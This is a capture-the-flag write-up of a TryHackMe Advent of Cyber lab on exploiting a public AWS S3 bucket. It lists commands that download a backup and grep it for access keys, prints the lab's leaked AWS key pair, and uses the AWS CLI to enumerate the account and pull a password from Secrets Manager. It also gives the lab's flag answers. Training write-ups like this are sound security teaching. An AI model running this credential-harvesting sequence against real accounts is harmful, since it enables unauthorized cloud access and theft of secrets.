---
title:  "TryHackMe: Advent of Cyber - Day 17 - Elf Leaks"
date:   2021-12-19 09:30:00 +1000
excerpt: Learning about AWS Exploits.
---

This is a write up for the Day 17 - Elf Leaks challenge in the [**Advent of Cyber**](https://tryhackme.com/room/adventofcyber3) room on [TryHackMe](https://tryhackme.com). Some tasks may have been omitted as they do not require an answer.

***

### What is the name of the S3 Bucket used to host the HR Website announcement?

View the source of the image to see the S3 bucket.

<img src="{{ site.baseurl }}/assets/images/2021-12-19-advent-of-cyber-day-17/d17_01.jpg">

> Answer: **images.bestfestivalcompany.com**

### What is the message left in the flag.txt object from that bucket?

Navigating to https://s3.amazonaws.com/images.bestfestivalcompany.com shows all the files in the bucket.

Opening https://s3.amazonaws.com/images.bestfestivalcompany.com/flag.txt shows the required flag.

> Answer: **It's easy to get your elves data when you leave it so easy to find!**

### What other file in that bucket looks interesting to you?

Going back to https://s3.amazonaws.com/images.bestfestivalcompany.com shows an interesting zip file.

<img src="{{ site.baseurl }}/assets/images/2021-12-19-advent-of-cyber-day-17/d17_02.jpg">

> Answer: **wp-backup.zip**

### What is the AWS Access Key ID in that file?

Run the following commands.

```
curl https://s3.amazonaws.com/images.bestfestivalcompany.com/wp-backup.zip -o wp-backup.zip
unzip wp-backup.zip
grep -r 'AKIA'
```

<img src="{{ site.baseurl }}/assets/images/2021-12-19-advent-of-cyber-day-17/d17_03.jpg">

<img src="{{ site.baseurl }}/assets/images/2021-12-19-advent-of-cyber-day-17/d17_04.jpg">

> Answer: **AKIAQI52OJVCPZXFYAOI**

### What is the AWS Account ID that access-key works for?

Run the following command.

```
aws configure --profile aoc
Enter AKIAQI52OJVCPZXFYAOI
Enter Y+2fQBoJ+X9N0GzT4dF5kWE0ZX03n/KcYxkS1Qmc
Enter us-east-1

aws sts get-access-key-info --access-key-id AKIAQI52OJVCPZXFYAOI --profile aoc
```

<img src="{{ site.baseurl }}/assets/images/2021-12-19-advent-of-cyber-day-17/d17_05.jpg">

> Answer: **019181489476**

### What is the Username for that access-key?

Enter the following command.

```
aws sts get-caller-identity --profile aoc
```

<img src="{{ site.baseurl }}/assets/images/2021-12-19-advent-of-cyber-day-17/d17_06.jpg">

> Answer: **ElfMcHR@bfc.com**

### There is an EC2 Instance in this account. Under the TAGs, what is the Name of the instance?

Run the following command.

```
aws ec2 describe-instances --output text --profile aoc
```

<img src="{{ site.baseurl }}/assets/images/2021-12-19-advent-of-cyber-day-17/d17_07.jpg">

> Answer: **HR-Portal**

### What is the database password stored in Secrets Manager?

Run `aws secretsmanager list-secrets --profile aoc`

<img src="{{ site.baseurl }}/assets/images/2021-12-19-advent-of-cyber-day-17/d17_08.jpg">

Run `aws secretsmanager get-secret-value --secret-id HR-Password --profile aoc --region eu-north-1`

<img src="{{ site.baseurl }}/assets/images/2021-12-19-advent-of-cyber-day-17/d17_09.jpg">

> Answer: **Winter2021!**

### Recap

In this task we learnt:
 * How to exploit AWS implementations
 